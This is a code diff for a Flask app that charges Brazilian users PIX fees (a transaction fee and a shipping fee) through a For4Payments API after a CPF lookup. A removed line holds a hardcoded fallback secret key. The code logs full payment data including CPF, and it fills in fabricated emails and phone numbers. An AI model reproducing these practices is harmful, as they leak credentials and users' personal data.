@@ -504,16 +504,29 @@ def verificar_endereco():
                          current_year=datetime.now().year)
 
 
+def format_phone_number(phone: str) -> str:
+    """
+    Formata o número de telefone para o padrão aceito pela API
+    """
+    # Remove todos os caracteres não numéricos
+    phone = ''.join(filter(str.isdigit, phone))
+
+    # Se o telefone já começar com 55, mantém como está
+    if not phone.startswith('55'):
+        phone = f"55{phone}"
+
+    return phone
+
 class For4PaymentsAPI:
-    API_URL = "https://api.for4payments.com.br/v1"  # URL base corrigida
+    API_URL = "https://api.for4payments.com.br/v1"
 
     def __init__(self, secret_key: str):
         self.secret_key = secret_key
-        logger.info(f"Initializing For4PaymentsAPI with key: {secret_key[:8]}...")
+        logger.info(f"Initializing For4PaymentsAPI with key: {self.secret_key[:8]}...")
 
     def _get_headers(self) -> Dict[str, str]:
         headers = {
-            'Authorization': self.secret_key,  # Removido o 'Bearer'
+            'Authorization': self.secret_key,  # Sem o 'Bearer'
             'Content-Type': 'application/json',
             'Accept': 'application/json'
         }
@@ -523,21 +536,22 @@ class For4PaymentsAPI:
     def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
         try:
             # Validação e formatação dos dados
-            if not data.get('name') or not data.get('cpf'):
-                raise ValueError("Nome e CPF são obrigatórios")
+            if not data.get('name') or not data.get('email') or not data.get('cpf'):
+                raise ValueError("Nome, email e CPF são obrigatórios")
 
             # Format and validate amount
             amount_in_cents = int(float(data['amount']) * 100)
 
-            # Remove qualquer formatação do CPF
+            # Remove qualquer formatação do CPF e telefone
             cpf = ''.join(filter(str.isdigit, data['cpf']))
+            phone = format_phone_number(data.get('phone', ''))
 
             # Estrutura do payload seguindo o script TypeScript
             payment_data = {
                 "name": data['name'],
                 "email": data['email'],
                 "cpf": cpf,
-                "phone": data.get('phone', ''),
+                "phone": phone,
                 "paymentMethod": "PIX",
                 "amount": amount_in_cents,
                 "items": [{
@@ -584,117 +598,51 @@ class For4PaymentsAPI:
             logger.error(f"Erro ao criar pagamento: {str(e)}")
             raise
 
-    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
-        """Check the status of a payment"""
-        try:
-            response = requests.get(
-                f"{self.API_URL}/transaction.getPayment",
-                params={'id': payment_id},
-                headers=self._get_headers(),
-                timeout=30
-            )
-
-            if response.status_code == 200:
-                payment_data = response.json()
-                # Map For4Payments status to our application status
-                status_mapping = {
-                    'PENDING': 'pending',
-                    'PROCESSING': 'pending',
-                    'APPROVED': 'completed',
-                    'COMPLETED': 'completed',
-                    'PAID': 'completed',
-                    'EXPIRED': 'failed',
-                    'FAILED': 'failed',
-                    'CANCELED': 'cancelled',
-                    'CANCELLED': 'cancelled'
-                }
-
-                current_status = payment_data.get('status', 'PENDING')
-                mapped_status = status_mapping.get(current_status, 'pending')
-
-                return {
-                    'status': mapped_status,
-                    'pix_qr_code': payment_data.get('pixQrCode'),
-                    'pix_code': payment_data.get('pixCode')
-                }
-            elif response.status_code == 404:
-                return {'status': 'pending'}
-            else:
-                return {'status': 'pending'}
-
-        except Exception as e:
-            logger.error(f"Error checking payment status: {str(e)}")
-            return {'status': 'pending'}
-
-
-def create_payment_api() -> For4PaymentsAPI:
-    secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "8b8e8d09-6024-4f27-b28d-e6d4278bc2b7")
-    return For4PaymentsAPI(secret_key)
-
-def format_phone_number(phone: str) -> str:
-    """
-    Formata o número de telefone para o padrão aceito pela API (apenas dígitos, começando com 55)
-    """
-    # Remove todos os caracteres não numéricos
-    phone = ''.join(filter(str.isdigit, phone))
-
-    # Se o número já tiver 55 no início, remove para padronizar
-    if phone.startswith('55'):
-        phone = phone[2:]
-
-    # Remove o 9 extra do início do número, se existir
-    if len(phone) > 2 and phone[2] == '9':
-        phone = phone[:2] + phone[3:]
-
-    # Garante que tenha exatamente 10 dígitos (DDD + número)
-    if len(phone) != 10:
-        return None
-
-    # Adiciona o código do país (55)
-    return f"55{phone}"
-
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    user_data = session.get('dados_usuario') 
-    if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
-        return redirect(url_for('index'))
-
     try:
+        user_data = session.get('dados_usuario')
+        if not user_data:
+            flash('Sessão expirada. Por favor, faça a consulta novamente.')
+            return redirect(url_for('index'))
+
         payment_api = create_payment_api()
 
         # Formata o telefone adequadamente
         phone = format_phone_number(user_data.get('telefone', ''))
-        if not phone:
-            phone = generate_random_phone()
-            logger.info(f"Usando telefone gerado aleatoriamente: {phone}")
 
         # Garante que temos um email válido
         email = user_data.get('email', '')
         if not email or '@' not in email:
-            email = generate_random_email()
-            logger.info(f"Usando email gerado aleatoriamente: {email}")
+            email = f"user_{user_data['cpf']}@email.com"
+            logger.info(f"Generated email for user: {email}")
 
         payment_data = {
-            'name': user_data['nome_real'], 
+            'name': user_data['nome_real'],
             'email': email,
             'cpf': user_data['cpf'],
             'phone': phone,
-            'amount': 78.40  # Valor da tarifa transacional
+            'amount': 78.40
         }
 
         logger.info(f"Enviando dados para API de pagamento: {payment_data}")
-        pix_data = payment_api.create_pix_payment(payment_data)
-        logger.info(f"Resposta da API de pagamento: {pix_data}")
 
-        return render_template('pagamento.html',
-                           pix_data=pix_data,
-                           valor_total="78,40",
-                           current_year=datetime.now().year)
+        try:
+            pix_data = payment_api.create_pix_payment(payment_data)
+            logger.info(f"Resposta da API de pagamento: {pix_data}")
+
+            return render_template('pagamento.html',
+                               pix_data=pix_data,
+                               valor_total="78,40",
+                               current_year=datetime.now().year)
+        except Exception as e:
+            logger.error(f"Erro específico na criação do PIX: {str(e)}")
+            flash('Erro ao gerar o pagamento PIX. Por favor, tente novamente.')
+            return redirect(url_for('index'))
 
     except Exception as e:
-        logger.error(f"Erro ao gerar pagamento: {str(e)}")
-        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
+        logger.error(f"Erro geral na rota de pagamento: {str(e)}")
+        flash('Erro ao processar o pagamento. Por favor, tente novamente.')
         return redirect(url_for('index'))
 
 @app.route('/check_payment/<payment_id>')
@@ -755,7 +703,7 @@ def frete_apostila():
             payment_data = {
                 'name': user_data['nome_real'], 
                 'email': user_data.get('email', generate_random_email()), 
-'cpf': user_data['cpf'],
+                'cpf': user_data['cpf'],
                 'phone': user_data.get('phone', generate_random_phone()), 
                 'amount': 48.19  # Valor do frete
             }
